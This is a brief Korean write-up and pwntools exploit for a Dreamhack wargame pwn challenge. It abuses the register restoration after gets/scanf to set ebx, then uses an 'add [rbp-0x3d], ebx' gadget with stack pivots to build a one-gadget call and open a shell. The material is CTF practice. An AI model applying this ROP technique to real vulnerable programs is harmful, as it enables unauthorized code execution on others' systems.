
gets, scanf 는 함수 뒷부분에 레지스터들을 복구하는 과정이 있는데,
그 과정을 이용해서 payload를 짜서 ebx를 변조할 수 있다.
add dword ptr \[rbp - 0x3d\], ebx 를 이용해서 원가젯 만들기

```python
from pwn import *
from time import *

context.terminal=['tmux', 'splitw', '-h']

#p = process('./prob')
p = remote('host3.dreamhack.games', 11162)

#gdb.attach(p)
#pause()

ret = 0x000000000040101a
pop_rbp = 0x000000000040111d
scanf = 0x401145
add_rsp = 0x0000000000401016
og_offset = 0x0
add_rbp_rbx = 0x000000000040111c
leave_ret = 0x0000000000401168

payload = b'a' * 0x100 + p64(0x404900) + p64(scanf)
p.sendline(payload)
pause()

payload = b'a' * 0x100 + p64(0x404900 + 0x10) + p64(scanf) + p64(0x404980) + p64(scanf)
p.sendline(payload)
pause()

payload = b'dummy'
p.sendline(payload)
pause()
#0x404838 : 0x00007ff6e05991c2 - 0x7ff6e0537000
og_offset = 0xebdb3 - (0x00007ff6e05991c2 - 0x7ff6e0537000)

payload = b'a' * 0x70 + p64(0) * 5 + p64(0x401163) + b'a' * 0x60 + p64(0x404980 - 0x8) + p64(scanf)
p.sendline(payload)
pause()

payload = p64(og_offset & 0xffffffff) + p64(0) * 4 + p64(0x404980 - 0x8) + p64(0x401163) + b'a' * (0x100 - 0x38)
payload += p64(0x404838 + 0x3d) + p64(add_rbp_rbx) + p64(pop_rbp) + p64(0x404838 - 0x10) + p64(scanf)
p.sendline(payload)
pause()

payload = b'a' * 0x100 + p64(0x404400) + p64(ret)[:7]
p.sendline(payload)
pause()
p.interactive()
```